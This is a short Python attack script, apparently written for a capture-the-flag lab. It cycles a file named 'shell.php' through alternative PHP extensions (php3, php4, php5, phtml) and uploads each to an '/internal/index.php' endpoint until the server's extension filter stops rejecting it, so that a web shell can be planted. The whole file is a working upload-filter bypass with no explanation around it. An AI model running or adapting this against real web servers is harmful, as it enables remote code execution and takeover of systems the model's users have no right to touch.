import requests
import os

ip = "10.10.227.240"
url = f"http://{ip}:3333/internal/index.php"
extensions = ["php", "php3", "php4", "php5", "phtml"]

old_file_name = "shell.php"
file_name_without_extension = "shell"

for ext in extensions:
	new_file_name = file_name_without_extension + "." + ext
	os.rename(old_file_name, new_file_name)
	files = {"file": open(new_file_name, "rb")}
	response = requests.post(url, files = files).text
	if "Extension not allowed" in response:
		print(f"[-] Extension {ext} not allowed")
	else:
		print(f"[+] Extension {ext} might work, try it out!!!")
		break
	old_file_name = new_file_name



